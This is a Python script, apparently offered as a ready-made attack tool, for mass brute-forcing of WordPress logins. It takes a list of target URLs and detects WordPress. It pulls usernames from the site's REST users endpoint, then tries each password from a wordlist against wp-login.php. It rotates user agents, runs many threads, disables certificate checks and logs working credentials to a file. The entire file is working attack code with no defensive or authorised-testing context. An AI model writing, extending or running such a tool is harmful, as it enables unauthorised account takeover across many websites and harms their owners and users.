import requests
import socket
import os
import random
import re
import time
import sys
import concurrent.futures
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
from colorama import Fore, init
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL Warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Color Setup
init()
red, green, reset, yellow, blue = Fore.RED, Fore.GREEN, Fore.RESET, Fore.YELLOW, Fore.BLUE

# Global Variables
thread = 10
password_file = "passlist.txt"

# Banner Tools 
print ("""  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘
⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀
⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸
⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇
⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀
⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀
⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈  CODED TEAM            :⠀⠀⠀⠀JX-45 IT V3.0 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

███╗   ███╗ █████╗ ███████╗███████╗        ██╗    ██╗██████╗ ██████╗ ███████╗
████╗ ████║██╔══██╗██╔════╝██╔════╝        ██║    ██║██╔══██╗██╔══██╗██╔════╝
██╔████╔██║███████║███████╗███████╗        ██║ █╗ ██║██████╔╝██████╔╝█████╗  
██║╚██╔╝██║██╔══██║╚════██║╚════██║        ██║███╗██║██╔═══╝ ██╔══██╗██╔══╝  
██║ ╚═╝ ██║██║  ██║███████║███████║███████╗╚███╔███╔╝██║     ██████╔╝██║     
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚══╝╚══╝ ╚═╝     ╚═════╝ ╚═╝     
XML-RPC Brute Force Wordpress WP-LOGIN BRUTE FORCE
By @MASKTHEMOUSE                        
"""
# Check if password file exists
if not os.path.exists(password_file):
    print(f"{red}[ERROR]{reset} Password file '{password_file}' not found!")
    sys.exit(1)

passwords = open(password_file, "r", encoding="utf-8").read()

# Class for Brute Force Attack
class Brute:
    def __init__(self, url):
        self.url = url
        self.thread = thread
        self.headers = {
            "User-Agent": self.random_user_agent(),
            "Accept-Language": "en-US,en;q=0.5"
        }
        self.sessions = requests.Session()
        self.password_list = passwords.splitlines()

    def log_success(self, msg):
        print(f"[{green}SUCCESS{reset}] {self.url} => {green}{msg}{reset}")

    def log_failed(self, msg):
        print(f"[{red}FAILED{reset}] {self.url} => {red}{msg}{reset}")

    def check_wordpress(self):
        """Check if the site is running WordPress"""
        try:
            req = requests.get(self.url, headers=self.headers, timeout=10, verify=False)
            if "/wp-content/themes/" in req.text:
                self.log_success("WordPress Detected")
                return True
            self.log_failed("Not a WordPress site")
            return False
        except requests.exceptions.Timeout:
            self.log_failed("Timeout")
        except Exception as e:
            self.log_failed(str(e))
        return False

    def get_usernames(self):
        """Extract usernames from WordPress JSON API"""
        try:
            req = requests.get(f"{self.url}/wp-json/wp/v2/users", headers=self.headers, timeout=10, verify=False)
            usernames = re.findall(r'"slug":"(.*?)"', req.text)
            if usernames:
                return usernames
            self.log_failed("No usernames found")
        except requests.exceptions.Timeout:
            self.log_failed("Timeout")
        except Exception as e:
            self.log_failed(str(e))
        return []

    def brute_force(self, username):
        """Perform brute force attack on wp-login.php"""
        try:
            for password in self.password_list:
                data = {
                    "log": username,
                    "pwd": password,
                    "wp-submit": "Log In",
                    "redirect_to": f"{self.url}/wp-admin/",
                    "testcookie": "1"
                }
                req = self.sessions.post(f"{self.url}/wp-login.php", headers=self.headers, data=data, verify=False)
                if "dashboard" in req.text or "/wp-admin/admin-ajax.php" in req.text:
                    self.log_success(f"Login Successful: {username} | {password}")
                    self.save_result(username, password)
                    return True
        except requests.exceptions.Timeout:
            self.log_failed("Timeout")
        except Exception as e:
            self.log_failed(str(e))
        return False

    def save_result(self, username, password):
        """Save successful logins"""
        with open("successful_logins.txt", "a", encoding="utf-8") as f:
            f.write(f"{self.url}/wp-login.php#{username}@{password}\n")

    def random_user_agent(self):
        """Generate a random User-Agent"""
        user_agents_file = "user-agent.txt"
        if os.path.exists(user_agents_file):
            with open(user_agents_file, "r", encoding="utf-8") as f:
                user_agents = f.read().splitlines()
                return random.choice(user_agents)
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36"

    def start(self):
        """Start the brute-force process"""
        if not self.check_wordpress():
            return
        usernames = self.get_usernames()
        if not usernames:
            return
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.thread) as executor:
            results = executor.map(self.brute_force, usernames)
            if any(results):
                self.log_success("Brute-force attack completed.")
            else:
                self.log_failed("No valid credentials found.")

# Helper Functions
def parse_url(url):
    """Normalize and parse URL"""
    url = url.replace("http://", "").replace("https://", "").strip("/")
    return f"https://{url}" if is_port_open(url, 443) else f"http://{url}"

def is_port_open(host, port):
    """Check if a specific port is open"""
    try:
        with socket.create_connection((host, port), timeout=5):
            return True
    except:
        return False

def start_brute(url):
    """Initiate brute force attack"""
    parsed_url = parse_url(url)
    if not parsed_url:
        print(f"{red}[ERROR]{reset} Invalid URL: {url}")
        return
    Brute(parsed_url).start()

def main():
    """Main function to execute brute force attack"""
    global thread
    try:
        url_list_file = input(f"{yellow}- List of URLs: {reset}")
        if not os.path.exists(url_list_file):
            print(f"{red}[ERROR]{reset} File '{url_list_file}' not found!")
            sys.exit(1)

        urls = list(dict.fromkeys(open(url_list_file).read().splitlines()))
        thread = int(input(f"{yellow}- Number of Threads: {reset}"))
        
        with Pool(thread) as pool:
            pool.map(start_brute, urls)
    
    except Exception as e:
        print(f"{red}[ERROR]{reset} {str(e)}")

if __name__ == "__main__":
    try:
        os.makedirs("result_brute", exist_ok=True)
        main()
    except KeyboardInterrupt:
        sys.exit(1)
